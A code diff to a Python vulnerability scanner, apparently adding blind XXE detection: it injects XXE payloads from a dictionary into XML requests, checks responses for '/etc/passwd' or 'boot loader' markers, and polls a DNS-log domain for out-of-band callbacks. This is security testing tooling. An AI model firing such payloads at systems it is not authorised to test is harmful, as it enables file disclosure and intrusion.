@@ -204,16 +204,33 @@ class Prober:
         漏洞知识: https://portswigger.net/web-security/xxe
         """
 
+        if type(self.base_request['data']) is not str:
+            print("[*] XXE detection skipped")
+            return 
+        
         vulnerable = False
         try:
+            dnslog_domain = "{}.{}".format(''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for _ in range(5)), self.dnslog.domain)
             xxe_payloads = parse_dict(os.path.join(self.dictpath, 'xxe.txt'))
             for payload in xxe_payloads:
                 payload_request = self.gen_payload_request('&xxe;')
-                payload_request['data'] = payload_request['data'].replace('?>', '?>'+payload)
-                poc_rsp = send_request(payload_request)
+                if 'dnslog' not in payload:
+                    # 有回显
+                    payload_request['data'] = payload_request['data'].replace('?>', '?>'+payload)
+                    poc_rsp = send_request(payload_request)
 
-                if 'root:' in poc_rsp.response or 'boot loader' in poc_rsp.response:
-                    vulnerable = True
+                    if 'root:' in poc_rsp.response or 'boot loader' in poc_rsp.response:
+                        vulnerable = True
+                else:
+                    # 无回显
+                    payload = payload.replace('dnslog', dnslog_domain)
+                    payload_request['data'] = payload_request['data'].replace('?>', '?>'+payload)
+                    _ = send_request(payload_request)
+                    time.sleep(1)
+
+                    dnslog_records = self.dnslog.pull_logs()
+                    if dnslog_records:
+                        vulnerable = True
 
                 if vulnerable:
                     print("[+] Found XXE!")
